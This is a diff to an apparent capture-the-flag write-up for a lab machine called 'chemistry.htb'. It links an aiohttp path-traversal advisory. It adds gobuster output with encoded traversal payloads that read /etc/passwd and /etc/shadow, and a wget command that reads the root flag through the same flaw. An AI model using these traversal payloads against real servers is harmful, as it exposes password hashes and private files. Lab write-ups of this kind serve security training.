@@ -483,4 +483,30 @@ Country   : RESERVED, ZZ
 Summary   : HTML5, HTTPServer[BaseHTTP/0.6 Python/3.8.10, Python/3.9 aiohttp/3.9.1], JQuery[3.6.0], Matomo, Python[3.9], Script
 ```
 
-aiohttp cve: https://github.com/advisories/GHSA-5h86-8mv2-jq9f
+aiohttp lfi cve: https://github.com/advisories/GHSA-5h86-8mv2-jq9f
+
+gobuster lfi output:
+```bash
+//./C:/Windows/system32/drivers/etc/hosts (Status: 403) [Size: 14]
+//./C:/Windows/system32/drivers/etc/hosts. (Status: 403) [Size: 14]
+//?/C:/Windows/system32/drivers/etc/hosts (Status: 403) [Size: 14]
+//localhost/C$/Windows/system32/drivers/etc/hosts (Status: 403) [Size: 14]
+//127.0.0.1/C$/Windows/system32/drivers/etc/hosts (Status: 403) [Size: 14]
+//127.0.0.1/C$/Windows/system32/drivers/etc/hosts. (Status: 403) [Size: 14]
+//::1/C$/Windows/system32/drivers/etc/hosts (Status: 403) [Size: 14]
+//::1/C$/Windows/system32/drivers/etc/hosts. (Status: 403) [Size: 14]
+//localhost/C$/Windows/system32/drivers/etc/hosts. (Status: 403) [Size: 14]
+/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Status: 200) [Size: 1984]
+/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow (Status: 200) [Size: 1343]
+/..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd (Status: 200) [Size: 1984]
+/..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow (Status: 200) [Size: 1343]
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow (Status: 200) [Size: 1343]
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (Status: 200) [Size: 1984]
+///////../../../etc/passwd (Status: 403) [Size: 14]
+
+```
+
+root flag:
+```bash
+wget http://chemistry.htb:4444/assets/..%2F..%2F..%2F%2F..%2F..%2Froot/root.txt
+```
